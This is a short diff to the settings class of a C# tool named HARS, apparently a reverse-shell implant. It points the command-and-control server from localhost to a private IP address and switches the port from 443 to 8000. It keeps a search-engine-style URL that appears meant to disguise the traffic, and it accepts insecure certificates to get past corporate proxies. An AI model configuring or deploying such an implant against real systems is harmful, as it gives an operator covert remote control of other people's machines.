@@ -27,9 +27,9 @@ namespace HARS
             public static string Url = "search?q=search+something&qs=n&form=QBRE&cvid=";
             /* Listener */
             // Hostname/IP of C&C server
-            public static string Server = "https://127.0.0.1";
+            public static string Server = "https://192.168.1.249";
             // Listening port of C&C server
-            public static string Port = "443";
+            public static string Port = "8000";
             // Allow self-signed or "unsecure" certificates - Warning : often needed in corporate environment using proxy
             public static bool AllowInsecureCertificate = true;
         }
